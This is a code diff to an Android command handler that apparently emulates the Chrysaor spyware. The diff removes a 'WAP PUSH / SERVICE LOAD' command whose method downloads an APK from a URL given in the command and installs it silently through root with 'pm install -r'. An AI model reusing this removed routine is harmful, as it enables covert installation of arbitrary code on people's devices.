@@ -4,10 +4,6 @@ import android.content.Context;
 import android.content.SharedPreferences;
 import android.util.Log;
 import android.widget.Toast;
-import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -98,44 +94,12 @@ public class CommandHandler {
                     }
                 });
                 break;
-
-            case 10: // WAP PUSH / SERVICE LOAD
-                Log.i(TAG, "WAP PUSH / SERVICE LOAD: " + cmd.args);
-                showToast("Downloading and installing sample...");
-                executor.execute(() -> downloadAndInstall(cmd.args));
-                break;
-
             default:
                 Log.w(TAG, "Unknown command: " + cmd.commandId);
                 showToast("Unknown command");
                 break;
         }
     }
-
-    private void downloadAndInstall(String url) {
-        try {
-            String path = "/data/local/tmp/sample.apk";
-            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
-            conn.setConnectTimeout(15000);
-            conn.setReadTimeout(15000);
-            conn.setRequestMethod("GET");
-            InputStream is = conn.getInputStream();
-            FileOutputStream fos = new FileOutputStream(path);
-            byte[] buffer = new byte[8192];
-            int read;
-            while ((read = is.read(buffer)) != -1) fos.write(buffer, 0, read);
-            fos.close(); is.close(); conn.disconnect();
-            Log.i(TAG, "Downloaded APK to " + path);
-            String result = RootUtils.runCommand("pm install -r " + path);
-            Log.i(TAG, "Install result: " + result);
-            RootUtils.runCommand("rm -f " + path);
-            showToast("Install complete: " + result);
-        } catch (Exception e) {
-            Log.e(TAG, "Download/install error", e);
-            showToast("Error: " + e.getMessage());
-        }
-    }
-
     private void showToast(String msg) {
         android.os.Handler mainHandler = new android.os.Handler(context.getMainLooper());
         mainHandler.post(() -> Toast.makeText(context, "Chrysaor: " + msg, Toast.LENGTH_LONG).show());
